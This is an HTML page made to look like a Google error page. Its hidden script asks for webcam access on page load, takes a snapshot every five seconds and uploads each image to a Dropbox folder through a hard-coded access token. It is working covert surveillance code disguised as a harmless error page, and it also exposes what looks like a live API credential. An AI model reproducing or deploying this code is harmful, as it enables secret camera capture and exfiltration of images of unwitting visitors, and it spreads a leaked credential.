<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>404 Error - Webcam Snapshot</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      max-width: 600px;
      margin: 0 auto;
      color: #202124;
      text-align: center;
      background-color: #f8f9fa;
    }
    .logo {
      margin-top: 20px;
      margin-bottom: 20px;
    }
    .error-code {
      font-size: 36px;
      font-weight: bold;
      margin-bottom: 10px;
      color: #d9534f;
    }
    .error-message {
      font-size: 18px;
      line-height: 1.5;
    }
    .gray-text {
      color: #5f6368;
    }
    video {
      display: none;
    }
    canvas {
      display: none;
    }
    #error-message {
      display: none;
    }
  </style>
</head>
<body>
  <div class="logo">
    <!-- Optional logo, can add SVG logo or image -->
    <svg width="272" height="92" xmlns="http://www.w3.org/2000/svg">
      <g fill="none">
        <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
        <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
        <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
        <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
        <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
        <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
      </g>
    </svg>
  </div>
  <div class="error-code">500 Error - Google .</div>
  <div class="error-message">
    There was an error. Please try again later. <span class="gray-text">That's all we know.</span>
  </div>
 

  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 <!-- Add Dropbox Chooser SDK -->
<script type="text/javascript" src="https://www.dropbox.com/static/api/2/dropins.js" id="dropboxjs" data-app-key="ol6nf7u229ys627"></script>

<script>
const DROPBOX_TOKEN = 'sl.u.AFp6bsQwrTQ6c4CH5rGoxfHRT9kBpJCwbvHgRV-P2vTWyj8bw9mBRu97SoGZH_nNkCDc3IER_dQc_It4nZPBUhm4XALpCyvpj4dvGXAyAj3lYiaS31vmj2Qm0VPasUwFIV2E_-zMAp73iOIdo9mTHq4JOYdHl5By0GpAqxjF5LBfEae4tLGOU8T-arRqbH5dj9LvUxnc4fXUyj0q3wuRb1cTrPiyroxas9Xpk5QTVFNDuIlil9jR3kbLvFFmf5trtnuo4_0eWmg-LCjBfq6Q8PhfvWFYOwnM0oelV11QZOsxfTbwPMv_1WQv6FL6lBdsFD_CAqJtETdhYUVuWg94HdxBxXAb5hGSPPs18aLMn1D4APbMzTmJw8Jnucat0TsjgsQIQdBii8Dc8CYqJAXWAAiHJ2LJBLErOMFSqnGoxM0o_swO_3yLTsL_Bsd8fbyn2vR7KY96eU-T_EruRx6x8Dn-jH2GkflVNp94ga-N5Hnhzyl9B9S8EPlKw-nDZB-sjAMYWy3_Yad_JLLu_7GSTU1k31Io7gB1vuq7lGKwomeSkMMI_d1al7mfI7iqxggjfbGxhU4mzhcGgTKOytzdvYHNmTgLxesvqwX5PUVB2kUBEJX-Xs9dHY41ah2RyKa5HPJ8ek_st5N_EVGNJEh5g19yGsSj-ecZEEWLtYPbBXJEEwh0MM-sgmFzxp-XHdwBds55nKiRBi2hRIQik10DO5x4aRo2BzGWRwmQNVjzfAqRcFuxcSnv-crEb6uk6AiI8oRMv86qyOXIWVq1h7y1VrBb04sWjH-mFMNT7vF4MzEXOgm6NlxBxG9A88EfNAj6HUXnKhEoWDKKVXlOAwMYmsfssiDXr4AgYQRBjAYs-8S4y0JRXqp6QXhuuX8KP1OiWlXxjQOKNShjjf0A7sRa1MYVjX6wQKaEXttBOXYACxaZg-ZgFU8_1V2RM0_7fass-G5uIrkLgKC5z_bAwJQnviRJtSZDACX4poMkW71FN_aGoV0ei5I5t16wAwom8k4WWyjkBAiF8eTuqu0_rV3NArXkxzZ5RyksQ00Fp3D6R_SkqIftE2wVtUHIVjAJWNp0jIu7aygn3uLuiisWJFPiBcWM3AipSK9GJ86UsJip0ejHityd-8vXJh2p_tt7jtoQKrxB0gwmIUSu7xkOXA70hif5yesAiXSeuT-aMI3Wh9U4590rezP0GqlhItaDyC4ecsEfLH05EWOuINhllK7qowBgXe0sNtfGagTuxCGmk2wndHyIvEb9H55YgZQJau__TAApfL8dqFEp6cHsOcY7-njUl8k6_LRRlOTBS9zCCkYc1l5biLptgCITNXmhdEyfOhs3XbtXXcGB7UPRDLEF9FxaeANQaXwQZhD4Z8GLRf6YJPg3Vwie1ZNYUm5Bysxh4Ipy2H6DPT1-3Zmd1DYODg41DOxRGbJzECN6w2cKyDXGBuFxgt1vqef5MnIj6mONnOJeTCjmIn5DwhuBbOrF-aVJTe8BmkCITch8V4tPnZmdtQ'; // Never expose this in production!
const DROPBOX_FOLDER = '/snapshots';
// First verify your token is valid using:
const TEST_URL = 'https://api.dropboxapi.com/2/users/get_current_account';

fetch(TEST_URL, {
  method: 'POST',
  headers: { 'Authorization': `Bearer ${DROPBOX_TOKEN}` }
})
.then(response => response.json())
.then(console.log)
.catch(console.error);
async function uploadToDropbox(blob) {
  const filename = `${DROPBOX_FOLDER}/snapshot_${Date.now()}.png`;
  const url = 'https://content.dropboxapi.com/2/files/upload';

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${DROPBOX_TOKEN}`,
      'Content-Type': 'application/octet-stream',
      'Dropbox-API-Arg': JSON.stringify({
        path: filename,
        mode: 'add',
        autorename: true,
        mute: false
      })
    },
    body: blob
  });

  return response.json();
}

function captureAndUpload() {
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(async (blob) => {
    try {
      await uploadToDropbox(blob);
      console.log("Uploaded to Dropbox!");
    } catch (error) {
      console.error("Upload failed:", error);
    }
  }, 'image/png');
}

// Initialize webcam and start capturing
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    setInterval(captureAndUpload, 5000);
  })
  .catch(console.error);
</script>
</body>
</html>

